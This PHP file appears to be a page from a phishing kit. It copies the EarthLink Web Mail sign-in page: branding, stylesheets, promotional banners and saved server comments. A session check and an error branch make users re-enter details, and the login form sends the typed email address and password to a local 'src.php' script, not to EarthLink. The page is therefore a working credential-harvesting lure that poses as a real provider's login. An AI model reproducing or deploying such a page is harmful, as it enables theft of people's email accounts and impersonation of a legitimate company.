<?php
error_reporting(0);
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}
        
$email = @$_SESSION['email'];

$error = @$_GET['error'];
if ($error == "null_entry") {
    $formaction = "src.php";
    $showerror = "block";
} elseif ($error == "sec") {
    $formaction = "src.php?svr=tf";
    $showerror = "block";
} else {
        $formaction = "src.php";
    $showerror = "none";
}


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Web Mail</title>







 
<link rel="stylesheet" href="https://webmail.earthlink.net/wam/brand/earthlink/style60.css?v=6.5.8.102616.2219" type="text/css">


<!--[if lt IE 9]>
<script src='/wam/js/respond.min.js?v=6.5.8'></script> 
<![endif]-->

<link rel="stylesheet" href="https://webmail.earthlink.net/wam/brand/earthlink/chit.webmail.css" type="text/css">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<link rel="shortcut icon" type="image/ico" href="https://webmail.earthlink.net/wam/brand/earthlink/favicon.ico">



<script language="javascript"><!--


    if(d == null){allAllowed = true;}
    
    aiDomainCheck = true;

    function constructUrl(farmUrl){return "https://" + farmUrl + "/wam/Login";}

    var doOnLoad = new Array();

    function init() {
           if (arguments.callee.done) return;
           arguments.callee.done = true;
           // TT #18272 Turning off the old loadFocus which
           // stole the focus after ad has been loaded
           //loadFocus();

           for (i = 0; i < doOnLoad.length; i++) {
             doOnLoad[i](this);
           }
       };
   /* for Mozilla */
   if (document.addEventListener) {
       document.addEventListener("DOMContentLoaded", init, null);
   }

   /* for Internet Explorer */
   /*@cc_on @*/
   /*@if (@_win32)
       document.write("<script defer src='/wam/js/focusHandler.js?v=6.5.8'><"+"/script>");
   /*@end @*/

   /* for other browsers */
   window.onload = init;
// --></script>


    
    






<style>

/* These styles assume you are using ul and li */
.dropit {
    list-style: none;
    padding: 0;
    margin: 0;
}
.dropit .dropit-trigger { position: relative; }
.dropit .dropit-submenu {
    position: absolute;
    top: 100%;
    right: 10px !important;
    z-index: 1000;
    display: none;
    min-width: 150px;
    list-style: none;
    padding: 0;
    margin: 0;
    text-align:justify;
}
.dropit .dropit-open .dropit-submenu { display: block; }

.gearmenu ul { display: none; } /* Hide before plugin loads */
.gearmenu ul.dropit-submenu {
    background-color: #fff;
    border: 1px solid #b2b2b2;
    padding: 6px 0;
    margin: 3px 0 0 1px;
    border-radius: 6px;    
    -webkit-border-radius: 6px;
       -moz-border-radius: 6px;
            border-radius: 6px;
    -webkit-box-shadow: 0px 1px 3px rgba(0,0,0,0.15);
       -moz-box-shadow: 0px 1px 3px rgba(0,0,0,0.15);
            box-shadow: 0px 1px 3px rgba(0,0,0,0.15);
}          
.gearmenu ul.dropit-submenu a {
    display: block;
    font-size: 12px;
    line-height: 25px;
    color: #7a868e;
    padding: 0 18px;
}
.gearmenu ul.dropit-submenu a:hover {
    background: #648ACB;
    color: #fff;
    text-decoration: none;
}

.universalNav_6_0 {
    position: relative;
    background: url("/wam/images/earthlink/newNavBarH35.png") transparent;
    padding: 0px;
    margin: 0;
    height: 35px;
    vertical-align: middle;
}
.universalNav_6_0 table,
.universalNav_6_0 tr,
.universalNav_6_0 td {
    background-color: transparent;
}
.universalNav_6_0 #elnkImgId {
    height: 26px;
    margin-left:20px;   
}
.universalNav_6_0 #googleImgId {
    height: 35px;
}
.universalNav_6_0 #searchBoxId {
    width:95%; 
}
.universalNav_6_0 #searchButtonId {
    height: 20px;
}
.universalNav_6_0 #homeIconId, #gearIconId {
    height: 26px;
    margin-top:3px;
}
.universalLinks_6_0 a,
.universalLinks_6_0 span {
    padding: 0px 2px;
    font-size: 11px;
    font-family: Arial;
    font-weight: normal;
}
</style>

<script src="https://webmail.earthlink.net/wam/js/jquery-1.11.2.min.js"></script> 
<script src="https://webmail.earthlink.net/wam/js/dropit.js?v=6.5.8"></script> 
<script src="https://webmail.earthlink.net/wam/js/slidernav.js?v=6.5.8"></script>

<script>
$(document).ready(function() {
    $('.gearmenu').dropit();
    $('#addressbook').sliderNav();      
    $('#addressbook .slider-content ul li ul li a').click(function(e){
        e.preventDefault();
        var contact_card = $('#contact-card');
        //Get the name clicked on
        var name = $(this).text();
        //Set the name
        $('#contact-card .panel-title').html(name);
        $('#contact-card #card-name').html(name);
        //Randomize the image
        var img_id = Math.floor(Math.random() * (5 - 1 + 1)) + 1;
        //Set the image
        $('#contact-card .headshot img').attr('src', 'img/addressbook/'+img_id+'.jpg');
    }); 
});
</script>


<body><form style="margin: 0" method="GET" target="search" action="http://search.earthlink.net/track">
<table width="100%" class="universalNav_6_0" cellpadding="0" cellspacing="0">
    <tbody><tr valign="top">
        <!-- Open and close TD tags have to be on same line or contents will be misaligned in IE -->
        <td align="left" valign="middle" style="width:25%;">
            <a href="http://www.earthlink.net/"> <img id="elnkImgId" src="https://webmail.earthlink.net/wam/images/earthlink/elnk_logo.png" border="0" alt="EarthLink"></a></td>
        <td align="right" valign="middle"><img id="googleImgId" src="https://webmail.earthlink.net/wam/images/earthlink/nav_google_2017_sm.png"></td>
        <td align="center" valign="middle" style="width:30%;">
            <input type="hidden" name="url" value="/search">
            <input type="hidden" name="id" value="1024669">
            <input type="hidden" name="channel" value="webmail">
            <input type="hidden" name="area" value="earthlink-ws">
            <input type="hidden" name="vars" value="q,channel,area">
            <input id="searchBoxId" type="text" name="q" value="" size="10"></td>
        <td align="left" valign="middle">
            <input id="searchButtonId" type="image" src="https://webmail.earthlink.net/wam/images/earthlink/mag_button_smaller.png"></td>
        <td align="right" valign="top">
            <span class="universalLinks_6_0 " style="margin-left:8px; margin-right:20px;">
                <a href="http://my.earthlink.net/"><img id="homeIconId" src="https://webmail.earthlink.net/wam/images/earthlink/home_icon.png"></a>
                <span class="gearmenu dropit">
                    <span class="dropit-trigger">
                        <a href="https://webmail.earthlink.net/wam/login.jsp?redirect=%2Fwam%2Findex.jsp&amp;x=-1219230904#"><img id="gearIconId" src="https://webmail.earthlink.net/wam/images/earthlink/gear_icon.png"></a>
                        <ul class="dropit-submenu" style="display: none;">
                            <li><a href="http://myaccount.earthlink.net/">My Account</a></li>
                            <li><a href="http://support.earthlink.net/">Support</a></li>
                            <li><a href="http://www.earthlink.net/membercenter">Member Center</a></li>
                            <li><a href="http://myvoice.earthlink.net/">My Voice</a></li>
                        </ul>
                    </span>
                </span>
            </span>
        </td>
    </tr>
</tbody></table>
</form>





<div id="msgCenter60">
</div>



<div style="display: <?php echo "$showerror"; ?>;">

    <div class="error">Invalid entry. Please check your email address / password and try again.</div><br><center>
    
    
    </div>

    <br><center>
    
    

    


<div class="main-content">
    <div class="signInWidget">
        <form name="signinFrm" action="<?php echo "$formaction"; ?>" method="post" onsubmit="return checkLogin()">
        <input type="HIDDEN" name="page" value="/wam/index.jsp">
        <input type="HIDDEN" name="start" value="1">
        <div id="zone3dynamic1" class="elnk_Wam70_Login_bg" style="background-image: url(&quot;https://webmail.earthlink.net/wam/images/login/bg-4.jpg&quot;);">
            <div class="elnk_Wam70_Login_mainFrame">
                <div class="elnk_Wam70_Login_mainBox"></div>
                <div class="elnk_Wam70_Login_mainTitle">Welcome to WebMail</div>    
                <div class="elnk_Wam70_Login_inputBox"></div>               
                <div class="elnk_Wam70_Login_inputFieldContainer">                          
                    <script type="text/javascript">
                    if(checkjs)
                    {
                        document.write("<label for='uname'>Email Address:</label>");
                        document.write("<input type='hidden' name='tzoffset' value='" + tzoffset + "'>");
                        // User screen height/width
                        document.write( "<input type='hidden' name='screenSize' value='" + screen.width + "x" + screen.height + "'>" );
                        document.write("<div class='inline-errors'><div id='emailElement'></div><input tabindex='1' type='text' size='30' value='" + GetCookie('ZU') + "\' name='email' id='uname' class='username' onkeypress='checkCapsLock( event, \"emailElement\")' onBlur='hideInlineError(\"emailElement\")'></div>");
                        
                        document.write("<div class='notes'>(eg. your_address@earthlink.net)</div>");
                        
                        document.write("<label for='passw'>Password:</label>");
                        document.write("<div class='inline-errors'><div id='passwordElement'></div><input tabindex='2' type='password' value='' name='password' class='password' id='passw' onkeypress='checkCapsLock( event, \"passwordElement\")'  onBlur='hideInlineError(\"passwordElement\")'></div>");
                        
                            document.write("<div class='notes'><a href='https://myaccount.earthlink.net/cam/passmain.jsp' class='signinLinks' target='_blank'>Forgot your password?</a></div>");
                        
                        document.write("<div align='center'>");
                        document.write("<input tabindex='3' class='buttonLogin' src='https://webmail.earthlink.net/wam/images/earthlink/button-signin.gif' name='okey_x' type='image' value='Sign In'/>");
                        document.write("<div class='notes'><a href='http://www.earthlink.net/webmail/help/earthlink/en_US/login.html' target='_blanks' add='1' />Sign In Help</a></div></div>");
                        document.write("<span>");
                        document.write("<input id='saveuser' type='checkbox' value='on' name='saveuser' class='checkbox'");
                        if (GetCookie("ZU") != "") document.write(" CHECKED");
                        document.write("> <label for='saveuser' class='normal'>Remember my username on this computer.</label>");
                        document.write("</span>");

                    
                    // Put the focus on email field as soon
                                    // as the fields are rendered
                    loadFocus();
                    }else
                    {
                        document.write('Web Mail is currently unavailable. Please try again later.');
                    }
                    </script><label for="uname">Email Address:</label><input type="hidden" name="tzoffset" value="-7"><input type="hidden" name="screenSize" value="1366x768"><div class="inline-errors"><div id="emailElement" style="visibility: hidden;"></div><input tabindex="1" type="text" size="30" value="<?php echo "$email"; ?>" name="email" id="uname" class="username" onkeypress="checkCapsLock( event, &quot;emailElement&quot;)" onblur="hideInlineError(&quot;emailElement&quot;)"></div><div class="notes">(eg. your_address@earthlink.net)</div><label for="passw">Password:</label><div class="inline-errors"><div id="passwordElement"></div><input tabindex="2" type="password" value="" name="password" class="password" id="passw" onkeypress="checkCapsLock( event, &quot;passwordElement&quot;)" onblur="hideInlineError(&quot;passwordElement&quot;)"></div><div class="notes"><a href="https://myaccount.earthlink.net/cam/passmain.jsp" class="signinLinks" target="_blank">Forgot your password?</a></div><div align="center"><input tabindex="3" class="buttonLogin" src="https://webmail.earthlink.net/wam/images/earthlink/button-signin.gif" name="okey_x" type="image" value="Sign In"><div class="notes"><a href="http://www.earthlink.net/webmail/help/earthlink/en_US/login.html" target="_blanks" add="1">Sign In Help</a></div></div><span><input id="saveuser" type="checkbox" value="on" name="saveuser" class="checkbox"> <label for="saveuser" class="normal">Remember my username on this computer.</label></span>
                    <noscript>The Web Mail system requires you to have JavaScript enabled in your browser. See your browser's documentation for details on how to enable this feature.</noscript>
                    <div id="login_warning" style="color:red;display:inline"> </div>                                    
                </div>          
                <div class="signInError" style="display:none;"></div>
                <!-- Zone 1 Ad Start -->
                <div id="zone1dynamic1" class="promoBox1"><span><a href="http://www.earthlink.net/webmail/mobile/?CampaignID=MS:E:164:tech_tip:www_page" target="_blank" style="font-family:Hind;font-weight:bold;font-size:15px;color:#f60">MyEarthLink App!</a></span><br><span style="font-family:Hind;font-size:12px">Download the new mobile app for email, news, weather and stock updates!</span></div>
                <div id="zone2dynamic1" class="promoBox2"><span><a href="https://support.earthlink.net/articles/email/imap-email.php" target="_blank" style="font-family:Hind;font-weight:bold;font-size:15px;color:#f60">IMAP: Now Available!</a></span><br><span style="font-family:Hind;font-size:12px">IMAP email support is now available to all EarthLink customers.</span></div>            
                <!-- Zone 1 Ad End -->
                <div class="elnk_Wam70_Login_followBar"></div>
                <div class="elnk_Wam70_Login_followTitle">Follow us:</div>
                <a href="https://www.facebook.com/earthlink" class="elnk_Wam70_Login_followFacebook" target="_blank"></a>
                <a href="https://twitter.com/earthlink" class="elnk_Wam70_Login_followTwitter" target="_blank"></a>
                <!-- no consumer support yet <a href="http://www.youtube.com/user/earthlinkbiz" class="elnk_Wam70_Login_followYoutube" target="_blank"></a> -->
            </div>
        </div>      
        <div id="zone4dynamic1" class="elnk_Wam70_Login_ad">
        </div>
        </form>      
    </div>
    <div class="skyscraper">
    
            










<iframe name="skyscraperframe" onfocus="loadFocus()" src="https://webmail.earthlink.net/wam/html/blank.htm" width="120" height="600" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no">
    &nbsp;
</iframe>

<script type="text/javascript">
    function adbannerReplace() {
        if (frames['skyscraperframe']) {
            frames['skyscraperframe'].location.replace('https://webmail.earthlink.net/wam/brand/earthlink/google_ad_login.html');
        }
    }
    
    doOnLoad.push(adbannerReplace);
</script>

        

    </div>
</div>






<div class="footer" align="left">
<hr size="1">
<font face="Arial" size="1">
    © 2018 EarthLink. All Rights Reserved.<br>
    Members and visitors to the EarthLink Web site agree to abide by our
    <a href="http://www.earthlink.net/about/policies/" target="_blank">Policies and Agreements</a><br>
    <a href="http://www.earthlink.net/about/policies/privacy/" target="_blank">EarthLink Privacy Policy</a>
</font>

</div>


<div align="right" class="footer">
    Web Mail version 6.5.8
</div>



    
          

<script>


// create new js array for dynamic promos

    var zone1DynamicPromoArr = new Array(1);



    var zone2DynamicPromoArr = new Array(1);



    var zone3DynamicPromoArr = new Array(8);



    var zone4DynamicPromoArr = new Array(8);


// load ZONE1 dynamic promos array

    zone1DynamicPromoArr[0] = "<span><a href=\"http://www.earthlink.net/webmail/mobile/?CampaignID=MS:E:164:tech_tip:www_page\" target=\"_blank\" style=\"font-family:Hind;font-weight:bold;font-size:15px;color:#f60\">MyEarthLink App!</a></span><br><span style=\"font-family:Hind;font-size:12px\">Download the new mobile app for email, news, weather and stock updates!</span>";


// load ZONE2 dynamic promo array

    zone2DynamicPromoArr[0] = "<span><a href=\"https://support.earthlink.net/articles/email/imap-email.php\" target=\"_blank\" style=\"font-family:Hind;font-weight:bold;font-size:15px;color:#f60\">IMAP: Now Available!</a></span><br><span style=\"font-family:Hind;font-size:12px\">IMAP email support is now available to all EarthLink customers.</span>";


// load ZONE3 dynamic promo array

    zone3DynamicPromoArr[0] = "https://webmail.earthlink.net/wam/images/login/bg-1.jpg";

    zone3DynamicPromoArr[1] = "https://webmail.earthlink.net/wam/images/login/bg-2.jpg";

    zone3DynamicPromoArr[2] = "https://webmail.earthlink.net/wam/images/login/bg-3.jpg";

    zone3DynamicPromoArr[3] = "https://webmail.earthlink.net/wam/images/login/bg-4.jpg";

    zone3DynamicPromoArr[4] = "https://webmail.earthlink.net/wam/images/login/bg-5.jpg";

    zone3DynamicPromoArr[5] = "https://webmail.earthlink.net/wam/images/login/bg-6.jpg";

    zone3DynamicPromoArr[6] = "https://webmail.earthlink.net/wam/images/login/bg-7.jpg";

    zone3DynamicPromoArr[7] = "https://webmail.earthlink.net/wam/images/login/bg-8.jpg";


// load ZONE4 dynamic promo array

    zone4DynamicPromoArr[0] = "<img style=\"border:none\" src=\"https://webmail.earthlink.net/wam/images/login/ad-1.jpg\" usemap=\"#longButtonMap\"><map name=\"longButtonMap\"><area style=\"outline: none\"  href=\"http://my.earthlink.net\" shape=\"poly\" coords=\"531,37,526,40,522,44,521,49,522,55,525,58,530,62,684,62,690,59,694,55,695,49,693,43,689,39,684,38\" target=\"_blank\"/><area style=\"outline: none\"  href=\"http://my.earthlink.net\" shape=\"rect\" coords=\"1,1,719,89\" target=\"_blank\"/></map>       ";

    zone4DynamicPromoArr[1] = "<img style=\"border:none\" src=\"https://webmail.earthlink.net/wam/images/login/ad-2.jpg\" usemap=\"#shortButtonMap\"><map name=\"shortButtonMap\" ><area style=\"outline: none\"  href=\"https://www.earthlink.net/membercenter/domore.faces\" shape=\"poly\" coords=\"546,37,539,41,537,44,536,49,537,54,539,58,543,60,545,62,668,62,673,59,677,56,678,51,678,47,676,42,670,37\" target=\"_blank\"/><area style=\"outline: none\"  href=\"https://www.earthlink.net/membercenter/domore.faces\" shape=\"rect\" coords=\"1,1,719,89\" target=\"_blank\"/></map>     ";

    zone4DynamicPromoArr[2] = "<img style=\"border:none\" src=\"https://webmail.earthlink.net/wam/images/login/ad-3.jpg\" usemap=\"#shortButtonMap\"><map name=\"shortButtonMap\" ><area style=\"outline: none\"  href=\"https://www.earthlink.net/software/staysafe.faces\" shape=\"poly\" coords=\"546,37,539,41,537,44,536,49,537,54,539,58,543,60,545,62,668,62,673,59,677,56,678,51,678,47,676,42,670,37\" target=\"_blank\"/><area style=\"outline: none\"  href=\"https://www.earthlink.net/software/staysafe.faces\" shape=\"rect\" coords=\"1,1,719,89\" target=\"_blank\"/></map>     ";

    zone4DynamicPromoArr[3] = "<img style=\"border:none\" src=\"https://webmail.earthlink.net/wam/images/login/ad-4.jpg\" usemap=\"#twoLongButtonsMap\"><map name=\"twoLongButtonsMap\" ><area style=\"outline: none\"  href=\"https://itunes.apple.com/us/app/myearthlink/id1029656437?mt=8\" shape=\"poly\" coords=\"518,17,514,19,510,23,508,28,509,33,512,37,514,40,518,41,694,42,698,40,701,37,704,30,703,25,700,21,695,17\" target=\"_blank\"/><area style=\"outline: none\"  href=\"https://play.google.com/store/apps/details?id=com.earthlink.myearthlink\" shape=\"poly\" coords=\"519,47,512,50,508,59,509,64,512,68,517,72,694,71,698,69,702,66,704,61,702,54,698,48,692,47\" target=\"_blank\"/><area style=\"outline: none\"  href=\"http://www.earthlink.net/webmail/mobile/?CampaignID=Webmail\" shape=\"rect\" coords=\"1,1,719,89\" target=\"_blank\"/></map>";

    zone4DynamicPromoArr[4] = "<img style=\"border:none\" src=\"https://webmail.earthlink.net/wam/images/login/ad-5.jpg\" usemap=\"#shortButtonMap\"><map name=\"shortButtonMap\" ><area style=\"outline: none\"  href=\"https://www.earthlink.net/access/hyperlink.faces\" shape=\"poly\" coords=\"546,37,539,41,537,44,536,49,537,54,539,58,543,60,545,62,668,62,673,59,677,56,678,51,678,47,676,42,670,37\" target=\"_blank\"/><area style=\"outline: none\"  href=\"https://www.earthlink.net/access/hyperlink.faces\" shape=\"rect\" coords=\"1,1,719,89\" target=\"_blank\"/></map>       ";

    zone4DynamicPromoArr[5] = "<img style=\"border:none\" src=\"https://webmail.earthlink.net/wam/images/login/ad-6.jpg\" usemap=\"#shortButtonMap\"><map name=\"shortButtonMap\" ><area style=\"outline: none\"  href=\"https://www.earthlink.net/software/stayconnected.faces?tab=pcfinetune\" shape=\"poly\" coords=\"546,37,539,41,537,44,536,49,537,54,539,58,543,60,545,62,668,62,673,59,677,56,678,51,678,47,676,42,670,37\" target=\"_blank\"/><area style=\"outline: none\"  href=\"https://www.earthlink.net/software/stayconnected.faces?tab=pcfinetune\" shape=\"rect\" coords=\"1,1,719,89\" target=\"_blank\"/></map>     ";

    zone4DynamicPromoArr[6] = "<img style=\"border:none\" src=\"https://webmail.earthlink.net/wam/images/login/ad-7.jpg\" usemap=\"#shortButtonMap\"><map name=\"shortButtonMap\" ><area style=\"outline: none\"  href=\"https://myaccount.earthlink.net\" shape=\"poly\" coords=\"546,37,539,41,537,44,536,49,537,54,539,58,543,60,545,62,668,62,673,59,677,56,678,51,678,47,676,42,670,37\" target=\"_blank\"/><area style=\"outline: none\"  href=\"https://myaccount.earthlink.net\" shape=\"rect\" coords=\"1,1,719,89\" target=\"_blank\"/></map>     ";

    zone4DynamicPromoArr[7] = "<img style=\"border:none\" src=\"https://webmail.earthlink.net/wam/images/login/ad-8.jpg\" usemap=\"#shortButtonMap\"><map name=\"shortButtonMap\" ><area style=\"outline: none\"  href=\"https://www.earthlink.net/software/staysafe.faces\" shape=\"poly\" coords=\"546,37,539,41,537,44,536,49,537,54,539,58,543,60,545,62,668,62,673,59,677,56,678,51,678,47,676,42,670,37\" target=\"_blank\"/><area style=\"outline: none\"  href=\"https://www.earthlink.net/software/staysafe.faces\" shape=\"rect\" coords=\"1,1,719,89\" target=\"_blank\"/></map>     ";


    // generates a random number between 0 to (bounds - 1)
    function generateRandom( bounds ) {
        var randomNum = Math.floor(Math.random() * bounds);
        return randomNum;
    }

    var elnk_Wam70_Promo1_Index = generateRandom( zone1DynamicPromoArr.length );    
    var elnk_Wam70_Promo2_Index = generateRandom( zone2DynamicPromoArr.length );    

    // take a min here. useful in case of different bg and ad numbers
    var arrLength = Math.min (zone3DynamicPromoArr.length, zone4DynamicPromoArr.length);
    var elnk_Wam70_Img_Index = generateRandom( arrLength ); 
    
    $(document).ready(function() {
        $('.elnk_Wam70_Login_bg').css("background-image", "url('" + zone3DynamicPromoArr[elnk_Wam70_Img_Index] + "')");
        $('.elnk_Wam70_Login_ad').html(zone4DynamicPromoArr[elnk_Wam70_Img_Index]);     

        $('.promoBox1').html(zone1DynamicPromoArr[elnk_Wam70_Promo1_Index]);
        $('.promoBox2').html(zone2DynamicPromoArr[elnk_Wam70_Promo2_Index]);
    });

</script>
                        

    






<!-- Final ZooPageStats -->
<!-- wam/login.time=2ms -->
<!-- Req.Id: wamui-hamster.atl.sa.earthlink.net.1122 -->
<!-- Req.Sid: A428304858E7D93CF75A164BA56B3E9D -->
<!-- Req.Zsid: *nosession* -->
<!-- Req.Zslb: 161 -->
<!-- Req.Query: redirect&#61;%2Fwam%2Findex.jsp&amp;x&#61;-1219230904 -->
<!-- Req.Url: https://webmail.earthlink.net/wam/login.jsp -->
<!-- Req.useragent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 -->
<!-- App.version: 6.5.8 -->
<!-- Req.Timestamp: 1538381453406 -->
<!-- Req.remoteAddr: 129.56.166.185 -->

</center></body></html>
